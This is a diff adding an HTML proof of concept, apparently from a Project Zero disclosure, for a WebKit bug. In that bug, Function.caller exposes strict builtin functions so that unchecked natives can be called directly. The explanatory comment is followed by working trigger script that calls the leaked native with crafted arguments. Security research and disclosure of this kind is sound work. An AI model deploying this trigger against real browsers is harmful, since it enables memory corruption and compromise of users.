@@ -1,0 +1,55 @@
+<!--
+Source: https://bugs.chromium.org/p/project-zero/issues/detail?id=1032
+
+If a builtin script in webkit is in strict mode, but then calls a function that is not strict, this function is allowed to call Function.caller and can obtain a reference to the strict function. This is inconsistent with the behavior when executing non-builtin scripts in Safari, and the behavior in other browsers, where having a single strict function on the call stack forbids calls to Function.caller up to and including the first call to a strict function. This difference allows several sensitive native functions, such as arrayProtoPrivateFuncAppendMemcpy to be called directly, without the JavaScript wrappers that provide type and length checks.
+
+A minimal example of this issue is as follows, and a full example is attached.
+
+var q;
+function g(){
+	q = g.caller;
+	return 7;
+}
+
+
+var a = [1, 2, 3];
+a.length = 4;
+Object.defineProperty(Array.prototype, "3", {get : g});
+[4, 5, 6].concat(a);
+q(0x77777777, 0x77777777, 0);
+
+
+I strongly recommend this issue be fixed by changing the behaviour of Function.caller in strict mode, versus making changes to the natives, as it likely causes many similar problems 
+-->
+
+<html>
+<body>
+<script>
+
+var q;
+function g(){
+	//print("in g");
+	//print(arguments.caller);
+	//print(g.caller);
+	q = g.caller;
+	//print(g.caller);
+	return 7;
+
+}
+
+var a = [1, 2, 3];
+
+Object.defineProperty( Array.prototype, "1", { get : g} );
+
+
+var a = [1, 2, 3];
+a.length = 4;
+Object.defineProperty(Array.prototype, "3", {get : g});
+
+[4, 5, 6].concat(a);
+alert(q);
+q(0x7777, 0x7777, 0);
+
+</script>
+</body>
+</html>
